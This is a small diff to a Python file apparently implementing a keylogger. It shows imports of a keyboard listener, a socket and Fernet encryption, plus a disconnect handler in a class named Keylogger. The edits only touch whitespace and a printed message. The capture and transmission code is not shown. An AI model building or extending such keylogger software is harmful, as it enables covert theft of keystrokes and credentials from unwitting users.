@@ -1,4 +1,4 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener 
 import socket
 from cryptography.fernet import Fernet
 import sys
@@ -68,7 +68,7 @@ class Keylogger():
 
 				except (ConnectionResetError, BrokenPipeError):
 						
-						print("Server has been disconnected")
+						print("\nServer has been disconnected")
 
 						self.client.close()
 						
